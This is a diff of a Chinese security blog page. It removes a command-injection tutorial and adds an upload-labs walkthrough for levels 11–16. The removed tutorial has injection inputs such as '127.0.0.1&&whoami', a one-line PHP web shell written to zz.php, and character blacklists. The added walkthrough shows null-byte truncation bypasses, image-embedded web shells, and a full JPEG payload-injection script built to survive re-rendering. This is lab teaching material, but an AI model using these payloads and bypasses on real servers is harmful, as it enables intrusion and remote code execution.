@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Command injection summary | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Command injection summary | 九世的博客">
+  <title>upload level 11 - level 16 | 九世的博客</title>
+  <meta name="keywords" content=" 靶场练习 ">
+  <meta name="description" content="upload level 11 - level 16 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1081,9 +1081,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Command-injection-summary" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-upload-level-11-level-16" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Command injection summary</h1>
+        <h1 class="article-title">upload level 11 - level 16</h1>
     
     <div class="article-meta">
         
@@ -1092,14 +1092,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">靶场练习</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-29 22:56</time>
+        创建时间:<time class="date" title="更新时间: 2019-10-13 12:43:32">2019-10-13 11:09</time>
         
     </div>
     <div class="article-meta">
@@ -1121,7 +1121,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-text">level 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-text">level 16</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1136,114 +1136,415 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天把系统重装了一遍，起因经过不想说什么= =。由于下午都在安环境和打补丁，也就只有晚上能学习一下。把命令注入学习总结了一遍<br><img src="http://img.mp.itc.cn/upload/20170204/e5391a3c2cf145b18b5c6b56b7930b20_th.jpeg" alt=""></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞产生的原因</b><br>由于开发人员使用脚本语言提供的命令执行操作，过滤又不完善用户又可以只有控制输入的变量。导致了变量可控，造成命令注入。</p>
-<p><b>漏洞测试</b><br>测试环境为：win7+php5.6,使用phpstudy搭建<br>存在漏洞的脚本</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;命令注入测试&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;输入IP&lt;/p&gt;
-&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
-    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1360802561&auto=1&height=66"></iframe>
 
-&lt;?php
-header(&quot;Content-type: text/html;charset=utf-8&quot;);
-if(isset($_GET[&#39;host&#39;])){
-    $ud=$_GET[&#39;host&#39;];
-    $zx=system(&quot;ping &quot;.$ud);
-    echo $zx;
-    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>后端处理代码如下：</p>
+<pre><code class="php">&lt;?php
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;])){
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &#39;上传出错！&#39;;
+        }
+    } else{
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
 }
+
 ?&gt;
+</code></pre>
+<p>关键处：</p>
+<blockquote>
+<p>发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过</p>
+<pre><code class="php">$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10,99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+</code></pre>
+</blockquote>
+<p>看起来只能00截断(现在这方法几乎没用)<br>条件：</p>
+<pre><code>截断条件：
+    php版本小于5.3.4 详情关注CVE-2006-7243
+    php的magic_quotes_gpc为OFF状态
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/13/ujLdtx.png" alt=""></p>
+<p>这里借别人的图<br><img src="https://s2.ax1x.com/2019/10/13/ujLRAI.png" alt="ujLRAI.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/13/ujL7uQ.png" alt="ujL7uQ.png"></p>
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>后端处理代码如下：</p>
+<pre><code class="php">&lt;?php
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;])){
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr)){
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
 
-
-</code></pre><p>上面这个例子可以看到无任何过滤，输入变量又可控，导致可以被用户任意执行命令<br><img src="https://s2.ax1x.com/2019/01/29/kQ4lSP.png" alt="kQ4lSP.png"><br>输入：</p>
-<pre><code>127.0.0.1&amp;&amp;dir
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ40S0.md.png" alt="kQ40S0.md.png"><br>查看权限：</p>
-<pre><code>127.0.0.1&amp;&amp;whoami
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ4TmD.png" alt="kQ4TmD.png"></p>
-<p>反弹shell</p>
-<pre><code>echo &quot;&lt;?php @assert($_GET[_]);?&gt;&quot; &gt;&gt; zz.php
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQ57vV.png" alt="kQ57vV.png"></p>
-<p><img src="https://s2.ax1x.com/2019/01/29/kQ5zCR.png" alt="kQ5zCR.png"></p>
-<p><b>绕过过滤</b><br>一些程序员为了防止这种情况的发生，进行了一定的过滤</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;命令注入测试&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;输入IP&lt;/p&gt;
-&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
-    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
-&lt;?php
-header(&quot;Content-type: text/html;charset=utf-8&quot;);
-if(isset($_GET[&#39;host&#39;])){
-    $ud=$_GET[&#39;host&#39;];
-    $j=check($ud);
-    echo &quot;payload：$j&quot;;
-    echo &quot;&lt;br&gt;&quot;;
-    $zx=system(&quot;ping &quot;.$j);
-    echo $zx;
-    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传失败&quot;;
+        }
+    } else {
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+    }
 }
-function check($v){
-    $black_list=array(&#39;;&#39;=&gt;&#39;&#39;,&#39;&amp;&#39;=&gt;&#39;&#39;);
-    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/
-    return $th;
-}
+
 ?&gt;
-</code></pre><p>&amp;和；被过滤掉了，那么我们用|代替</p>
-<pre><code>127.0.0.1 | ipconfig
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQLxcd.png" alt="kQLxcd.png"></p>
-<p>过滤更严谨一点</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;命令注入测试&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;p&gt;输入IP&lt;/p&gt;
-&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
-    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
-    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+</code></pre>
+<p>还是00截断，这截断的方法有些不同所以只要php版本小于5.3就好<br><img src="https://s2.ax1x.com/2019/10/13/ujxj6f.png" alt="ujxj6f.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/13/ujzmBF.png" alt="ujzmBF.png"></p>
+<p>成功上传<br><img src="https://img-blog.csdn.net/20180729111354983?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjQ3NzA5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="70"></p>
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>后端处理代码：</p>
+<pre><code class="php">function getReailFileType($filename){
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    
+    $fileType = &#39;&#39;;    
+    switch($typeCode){      
+        case 255216:            
+            $fileType = &#39;jpg&#39;;
+            break;
+        case 13780:            
+            $fileType = &#39;png&#39;;
+            break;        
+        case 7173:            
+            $fileType = &#39;gif&#39;;
+            break;
+        default:            
+            $fileType = &#39;unknown&#39;;
+        }    
+        return $fileType;
+}
 
-&lt;?php
-header(&quot;Content-type: text/html;charset=utf-8&quot;);
-if(isset($_GET[&#39;host&#39;])){
-    $ud=$_GET[&#39;host&#39;];
-    $j=check($ud);
-    echo &quot;payload：$j&quot;;
-    echo &quot;&lt;br&gt;&quot;;
-    $zx=system(&quot;ping &quot;.$j);
-    echo $zx;
-    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;])){
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_type = getReailFileType($temp_file);
+
+    if($file_type == &#39;unknown&#39;){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
 }
-function check($v){
-    $black_list=array(&#39;;&#39;=&gt;&#39;&#39;,&#39;&amp;&#39;=&gt;&#39;&#39;,&#39;||&#39;=&gt;&#39;&#39;,&#39;|&#39;=&gt;&#39;&#39;,&#39;)&#39;=&gt;&#39;&#39;,&#39;(&#39;=&gt;&#39;&#39;);
-    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/
-    return $th;
+
+</code></pre>
+<p>判断了文件头，直接随便打开张图片，把马子插入进去就好然后上传<br><img src="https://s2.ax1x.com/2019/10/13/uvSBa4.png" alt="uvSBa4.png"></p>
+<p>包含如下<br><img src="https://s2.ax1x.com/2019/10/13/uvS7RI.png" alt="uvS7RI.png"></p>
+<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>后端处理代码如下：</p>
+<pre><code class="php">function isImage($filename){
+    $types = &#39;.jpeg|.png|.gif&#39;;
+    if(file_exists($filename)){
+        $info = getimagesize($filename);
+        $ext = image_type_to_extension($info[2]);
+        if(stripos($types,$ext)&gt;=0){
+            return $ext;
+        }else{
+            return false;
+        }
+    }else{
+        return false;
+    }
 }
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST[&#39;submit&#39;])){
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $res = isImage($temp_file);
+    if(!$res){
+        $msg = &quot;文件未知，上传失败！&quot;;
+    }else{
+        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+        if(move_uploaded_file($temp_file,$img_path)){
+            $is_upload = true;
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }
+}
+</code></pre>
+<p>用了getimagesize()检查是否为图片文件<br><img src="https://s2.ax1x.com/2019/10/13/uvpQQx.png" alt="uvpQQx.png"></p>
+<p>好像没啥用，用上面的方法继续过就好<br><img src="https://s2.ax1x.com/2019/10/13/uvpNYd.png" alt="uvpNYd.png"></p>
+<p>文件包含如下：<br><img src="https://s2.ax1x.com/2019/10/13/uvp2fs.png" alt="uvp2fs.png"></p>
+<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>又是用一个函数来判断是不是图片，，，，方法和上面一样就好</p>
+<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>后端处理代码：</p>
+<pre><code class="php">$is_upload = false;
+$msg = null;
+if (isset($_POST[&#39;submit&#39;])){
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
+    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+
+    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);
+
+    // 获得上传文件的扩展名
+    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromjpeg($target_path);
+
+            if($im == false){
+                $msg = &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.jpg&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagejpeg($im,$img_path);
+                @unlink($target_path);
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+
+    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefrompng($target_path);
+
+            if($im == false){
+                $msg = &quot;该文件不是png格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                 //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.png&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagepng($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;               
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+
+    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromgif($target_path);
+            if($im == false){
+                $msg = &quot;该文件不是gif格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.gif&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagegif($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }else{
+        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    }
+}
+</code></pre>
+<p>提示是：</p>
+<pre><code>本pass重新渲染了图片！
+</code></pre><p>参考文章：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析 - 先知社区</a></p>
+<p>采用国外大牛编写的脚本jpg_payload.php.</p>
+<pre><code class="php">&lt;?php
+    /*
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php &lt;jpg_name.jpg&gt;
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+    Sergey Bobrov @Black2Fan.
+
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+    */
+
+    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;
+
+
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
+        die(&#39;php-gd is not installed&#39;);
+    }
+
+    if(!isset($argv[1])) {
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
+    }
+
+    set_error_handler(&quot;custom_error_handler&quot;);
+
+    for($pad = 0; $pad &lt; 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis-&gt;readShort() != 0xFFD8) {
+            die(&#39;Incorrect SOI marker&#39;);
+        }
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis-&gt;eof())) {
+                        if($dis-&gt;readByte() === 0xFF) {
+                            if($dis-&gt;readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
+                    die(&#39;Success!&#39;);
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink(&#39;payload_&#39;.$argv[1]);
+    die(&#39;Something\&#39;s wrong&#39;);
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this-&gt;binData = &#39;&#39;;
+            $this-&gt;order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+                $this-&gt;binData = file_get_contents($filename);
+            } else {
+                $this-&gt;binData = $filename;
+            }
+            $this-&gt;size = strlen($this-&gt;binData);
+        }
+
+        public function seek() {
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        }
+
+        public function skip($skip) {
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        }
+
+        public function readByte() {
+            if($this-&gt;eof()) {
+                die(&#39;End Of File&#39;);
+            }
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this-&gt;binData) &lt; 2) {
+                die(&#39;End Of File&#39;);
+            }
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) {
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        }
+    }
 ?&gt;
-</code></pre><p>或许这样可以防御大部分攻击，但是并不能完全保证不会被FUZZ绕过，而且未来说不定也会有办法什么之类的。<br>防御方案有两个：</p>
-<pre><code>1.在获取用户输入后，用正则匹配出要进行命令执行的
-2.加入token机制，表单限制为只能输入数字
-</code></pre><p>转载请声明：转自422926799.github.io</p>
+</code></pre>
+<p>先上传一张图片，然后把上传成功的图片下载下来<br><img src="https://s2.ax1x.com/2019/10/13/uvCyGj.png" alt="uvCyGj.png"></p>
+<p>之后如下：<br><img src="https://s2.ax1x.com/2019/10/13/uvPkOP.png" alt="uvPkOP.png"></p>
+<p>上传+文件包含<br><img src="https://s2.ax1x.com/2019/10/13/uvPJTU.png" alt="uvPJTU.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1253,12 +1554,12 @@ function check($v){
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Command injection summary</p>
+    <p><span class="copy-title">文章标题:</span>upload level 11 - level 16</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-29, 22:56:40</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/e2532565.html" title="Command injection summary">http://422926799.github.io/posts/e2532565.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-13, 11:09:54</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-13, 12:43:32</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/470078a2.html" title="upload level 11 - level 16">http://422926799.github.io/posts/470078a2.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
